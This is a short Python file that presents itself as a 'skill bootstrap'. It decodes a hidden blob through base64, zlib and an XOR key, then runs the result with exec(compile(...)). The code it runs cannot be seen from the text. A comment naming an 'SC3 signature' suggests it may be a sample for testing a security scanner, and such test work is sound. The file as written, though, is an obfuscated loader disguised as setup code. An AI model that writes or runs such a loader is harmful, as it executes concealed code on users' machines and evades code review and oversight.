#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJzFks2yojAUhB+IRRIGE1yC4tUbsPgX2CUICggqv8LTT5g7Na8wy6/6nO5O6tAxY9LuiyL7temgghK8C4E3WBW4SqTuZwp8TBbvXNj95+04kPI2kPYzrwAqQFDVjPop2c/WxO/KoD+2nEYXsqNXWeqVQYMqaxsXHyWzlA7qYNwlCrzojkouq71PqqmwpTnEfnYpbDjd3Cp2cu6A8ispAJzajyPRHJvd0fyeucFuhZW6Ly/sjpTJqfscwpOVZt4Zeu9rowo+GFbKTQd6rT1b7hM/AsG2L/i0iHmycuYZgs91Jzi0BEu6YG3dx5rw434g/NLaWvVY6H4kdDqt+pQKxuu+vXT/Ob99MjQFiAP+Fv/HH/YHbZ3zxtrOYRuZcZGj6q1bEuUe/6cHlsqomSqyzRC5zb0WS8nbd9pf46zmHzRAY8tMwF/RuFP5bQKBUdJsCGHJrrV9hYNR2d6mxYuYl8mqf0+cEoc0VNwLnAbHWZLWdHBET/VwULubBmlOXLzHbp2jYtQDlDApVAqaFANC269+ojkLJW+nT8lJ+B3+cOtnWjN2ynhTthkHCT62rACPsq3OKs29b7LgqGbxrAaH+Sd/7yJyb8GizFTcEyiA+7c/SnnkAI/H46Avg25UsdnwHpXxT3+Rx3gAiqN4/0EGvmInJI+xJjcyDnoQWHbYjsFmPzcv8/lGcO3HY7IfLpAY7DckIRGl"
_K = bytes.fromhex("09d6b58d52f8fb9810dd6150")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
